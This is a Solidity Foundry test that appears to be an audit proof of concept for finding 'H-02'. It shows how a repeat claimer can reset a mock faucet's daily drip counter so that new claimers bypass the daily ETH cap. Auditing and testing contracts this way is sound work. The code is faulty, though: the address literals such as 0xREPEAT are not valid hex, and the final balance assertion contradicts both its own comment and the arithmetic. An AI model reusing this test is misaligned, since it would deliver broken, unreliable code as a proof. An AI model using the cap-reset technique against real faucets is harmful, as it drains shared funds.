// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "./MockFaucet.sol";

contract EthCapBypassTest is Test {
    MockFaucet faucet;

    address repeatClaimer = address(0xREPEAT); // Already claimed ETH
    address new1 = address(0xNEW1);
    address new2 = address(0xNEW2);
    address new3 = address(0xNEW3);

    function setUp() public {
        faucet = new MockFaucet();
        // Fund faucet with 0.1 ETH
        vm.deal(address(faucet), 0.1 ether);

        // Make repeatClaimer a "repeat" by claiming once and advancing time
        vm.prank(repeatClaimer);
        faucet.claimFaucetTokens{value: 0}();
        vm.warp(block.timestamp + 4 days); // Past cooldown/day change
    }

    // H-02: Bypass dailySepEthCap using repeat claimer to reset dailyDrips
    function test_ethCapBypassAndDrain() public {
        // Daily cap = 0.02 ETH → only 2 claims allowed (0.01 each)

        // New1 claims — dailyDrips = 0.01
        vm.prank(new1);
        faucet.claimFaucetTokens{value: 0}();
        assertEq(faucet.dailyDrips(), 0.01 ether);

        // Repeat claimer resets counter to 0
        vm.prank(repeatClaimer);
        faucet.claimFaucetTokens{value: 0}();
        assertEq(faucet.dailyDrips(), 0);

        // New2 claims — passes because counter reset
        vm.prank(new2);
        faucet.claimFaucetTokens{value: 0}();
        assertEq(faucet.dailyDrips(), 0.01 ether);

        // Repeat again
        vm.prank(repeatClaimer);
        faucet.claimFaucetTokens{value: 0}();
        assertEq(faucet.dailyDrips(), 0);

        // New3 claims — third claim, bypassing cap
        vm.prank(new3);
        faucet.claimFaucetTokens{value: 0}();

        // Total dripped: 0.03 ETH > 0.02 cap → bypass proven
        assertGt(address(faucet).balance, 0.07 ether); // Less than initial 0.1 - 0.03
    }
}